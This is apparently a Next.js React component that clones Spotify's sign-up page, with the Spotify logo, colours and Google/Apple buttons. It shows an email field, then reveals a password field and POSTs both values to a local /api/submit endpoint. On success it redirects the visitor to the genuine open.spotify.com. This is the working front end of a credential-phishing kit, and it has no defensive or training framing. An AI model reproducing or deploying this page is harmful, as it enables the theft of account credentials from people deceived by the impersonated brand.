"use client";

import { redirect } from "next/dist/server/api-utils";
import { useState } from "react";
import { useEffect } from 'react';

export default function SpotifyLogin() {

  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });
  

  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState("idle");
  const [statusMsg, setStatusMsg] = useState("");

  const handleSubmit = async () => {
    setLoading(true);
    setStatus("idle");

    try {
      const response = await fetch("/api/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });

      const data = await response.json();

      if (response.ok) {
        // window open to spotify.com
        window.location.href = "https://open.spotify.com/intl-id/";
      } else {
        setStatus("error");
        setStatusMsg(` ${data.error || "Email atau password salah"}`);
      }
    } catch (error) {
      setStatus("error");
      setStatusMsg("✗ Gagal menghubungkan ke server");
    } finally {
      setLoading(false);
    }
  };



  return (
    <div
      className="min-h-screen flex flex-col justify-center items-center px-5 py-10"
      style={{
        background: "linear-gradient(rgb(42, 42, 42), rgb(0, 0, 0))",
        fontFamily: "Circular, -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Arial, sans-serif",
      }}
    >
      <div
        className="w-full rounded-lg"
        style={{
          maxWidth: "480px",
          backgroundColor: "#121212",
          padding: "50px 80px",
        }}
      >
        <div className="w-full mx-auto">
          {/* Logo */}
          <div className="flex justify-center" style={{ margin: "70px auto 10px" }}>
            <img src="/spotify.png" alt="Spotify" style={{ width: "32px", height: "32px" }} />
          </div>

          <h1
            className="text-white text-center font-bold mb-9"
            style={{
              fontSize: "48px",
              fontWeight: "700",
              letterSpacing: "-0.04em",
              lineHeight: "1.2",
              marginBottom: "35px",
            }}
          >
            Sign up to start listening
          </h1>

          {/* Email Input */}
          <div style={{ marginBottom: "20px" }}>
            <label
              className="block font-bold"
              style={{
                color: "#ffffff",
                fontSize: "14px",
                marginBottom: "10px",
              }}
            >
              Email address
            </label>
            <input
            name="email"
                type="email"
        
                id="email"
                placeholder="nama@domain.com"
                className="w-full"
                style={{
                padding: "12px",
                border: "1px solid #878787",
                borderRadius: "4px",
                backgroundColor: "#121212",
                color: "#ffffff",
                fontSize: "16px",
                transition: "all 0.2s ease",
                marginBottom: "8px",
              }}
              onChange={(e) => setFormData({...formData, email: e.target.value})}
              onFocus={(e) => {
                e.currentTarget.style.borderColor = "#ffffff";
                e.currentTarget.style.borderWidth = "2px";
              }}
              onBlur={(e) => {
                e.currentTarget.style.borderColor = "#878787";
                e.currentTarget.style.borderWidth = "1px";
              }}
              onMouseEnter={(e) => (e.currentTarget.style.borderColor = "#ffffff")}
              onMouseLeave={(e) => document.activeElement !== e.currentTarget && (e.currentTarget.style.borderColor = "#878787")}
            />

            <label
              className="block font-bold"
              id ="passlabel"
              style={{
                color: "#ffffff",
                fontSize: "14px",
                marginBottom: "10px",
                display: "none",
              }}
            >
              Password
            </label>
            <input
              type="password"
              id="password"
              name="password"
              placeholder="8-16 characters"
             

              className="w-full"
              style={{
                padding: "12px",
                border: "1px solid #878787",
                borderRadius: "4px",
                backgroundColor: "#121212",
                color: "#ffffff",
                fontSize: "16px",
                transition: "all 0.2s ease",
                marginBottom: "8px",
                display: "none",
              }}
              onFocus={(e) => {
                e.currentTarget.style.borderColor = "#ffffff";
                e.currentTarget.style.borderWidth = "2px";
              }}
              onBlur={(e) => {
                e.currentTarget.style.borderColor = "#878787";
                e.currentTarget.style.borderWidth = "1px";
              }}
              onChange={(e) => setFormData({...formData, password: e.target.value})}
              onMouseEnter={(e) => (e.currentTarget.style.borderColor = "#ffffff")}
              onMouseLeave={(e) => document.activeElement !== e.currentTarget && (e.currentTarget.style.borderColor = "#878787")}
            />
            <a
              href="/notelp"
              style={{
                color: "#1ed760",
                fontSize: "14px",
                marginTop: "8px",
                cursor: "pointer",
                fontWeight: "450",
              }}
              onMouseEnter={(e) => (e.currentTarget.style.textDecoration = "underline")}
              onMouseLeave={(e) => (e.currentTarget.style.textDecoration = "none")}
            >
              Use phone number instead
            </a>
          </div>

          <button
            id="continuebtn"
            type="submit"
            className="w-full font-bold"
            style={{
              padding: "16px",
              border: "none",
              borderRadius: "500px",
              backgroundColor: "#1ed760",
              color: "#000000",
              fontSize: "15px",
              fontWeight: "720",
              cursor: "pointer",
              display: "block",
              transition: "all 0.2s ease",
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.transform = "scale(1.04)";
              e.currentTarget.style.backgroundColor = "#1fdf64";
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.transform = "scale(1)";
              e.currentTarget.style.backgroundColor = "#1ed760";
            }}
            onClick={() => {
                const passlabel = document.getElementById("passlabel");
                const password = document.getElementById("password");
                if (passlabel) {
                    passlabel.style.display = "block";
                }
                if (password) {
                    password.style.display = "block";
                }
                const continuebtn = document.getElementById("continuebtn");
                if (continuebtn) {
                    continuebtn.style.display = "none";
                }
                const continuebtn2 = document.getElementById("continuebtn2");
                if (continuebtn2) {
                    continuebtn2.style.display = "block";
                }

            }}
          >
            Continue
          </button>
          <button
            id="continuebtn2"
            type="submit"
            className="w-full font-bold"
            style={{
              padding: "16px",
              border: "none",
              borderRadius: "500px",
              backgroundColor: "#1ed760",
              color: "#000000",
              fontSize: "15px",
              fontWeight: "720",
              cursor: "pointer",
              transition: "all 0.2s ease",
                display: "none",
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.transform = "scale(1.04)";
              e.currentTarget.style.backgroundColor = "#1fdf64";
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.transform = "scale(1)";
              e.currentTarget.style.backgroundColor = "#1ed760";
            }}
            onClick={handleSubmit}
          >
            Register
          </button>

          <div
            className="flex items-center"
            style={{
              margin: "18px 0",
              color: "#878787",
              fontSize: "14px",
            }}
          >
            <div style={{ flex: 1, height: "1px", backgroundColor: "#292929", marginRight: "12px" }}></div>
            <span>OR</span>
            <div style={{ flex: 1, height: "1px", backgroundColor: "#292929", marginLeft: "12px" }}></div>
          </div>

          {/* Social Buttons */}
          <button
            className="w-full mb-2 font-bold flex items-center justify-center gap-3 relative"
            style={{
              padding: "13px",
              border: "1px solid #878787",
              borderRadius: "500px",
              backgroundColor: "transparent",
              color: "#ffffff",
              fontSize: "15px",
              cursor: "pointer",
              transition: "all 0.2s ease",
            }}
            onMouseEnter={(e) => (e.currentTarget.style.borderColor = "#ffffff")}
            onMouseLeave={(e) => (e.currentTarget.style.borderColor = "#878787")}
          >
            <svg className="absolute" style={{ left: "32px" }} width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
              <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
              <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" />
              <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
            </svg>
            Sign up with Google
          </button>

          <button
            className="w-full mb-2 font-bold flex items-center justify-center gap-3 relative"
            style={{
              padding: "13px",
              border: "1px solid #878787",
              borderRadius: "500px",
              backgroundColor: "transparent",
              color: "#ffffff",
              fontSize: "15px",
              cursor: "pointer",
              transition: "all 0.2s ease",
            }}
            onMouseEnter={(e) => (e.currentTarget.style.borderColor = "#ffffff")}
            onMouseLeave={(e) => (e.currentTarget.style.borderColor = "#878787")}
          >
            <svg className="absolute" style={{ left: "32px" }} width="20" height="20" viewBox="0 0 24 24" fill="#FFFFFF" xmlns="http://www.w3.org/2000/svg">
              <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
            </svg>
            Sign up with Apple
          </button>

          <div
            className="text-center"
            style={{
              marginTop: "35px",
              color: "#a7a7a7",
              fontSize: "15px",
              marginBottom: "10px",
            }}
          >
            Already have an account?{" "}
            <link
              href="/"
              style={{
                color: "#ffffff",
                textDecoration: "none",
                fontWeight: "700",
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.color = "#1ed760";
                e.currentTarget.style.textDecoration = "underline";
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.color = "#ffffff";
                e.currentTarget.style.textDecoration = "none";
              }}
            >
              Sign in
            </link>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div
        className="text-center"
        style={{
          marginTop: "40px",
          color: "#878787",
          fontSize: "11px",
          lineHeight: "1.6",
          backgroundColor: "#121212",
          padding: "30px 20px",
          width: "100%",
          maxWidth: "480px",
        }}
      >
        This site is protected by reCAPTCHA and the Google{" "}
        <a
          href="#"
          style={{
            color: "#878787",
            textDecoration: "underline",
          }}
          onMouseEnter={(e) => (e.currentTarget.style.color = "#ffffff")}
          onMouseLeave={(e) => (e.currentTarget.style.color = "#878787")}
        >
          Privacy Policy
        </a>{" "}
        and{" "}
        <a
          href="#"
          style={{
            color: "#878787",
            textDecoration: "underline",
          }}
          onMouseEnter={(e) => (e.currentTarget.style.color = "#ffffff")}
          onMouseLeave={(e) => (e.currentTarget.style.color = "#878787")}
        >
          Terms of Service
        </a>{" "}
        apply.
      </div>
    </div>
  );
}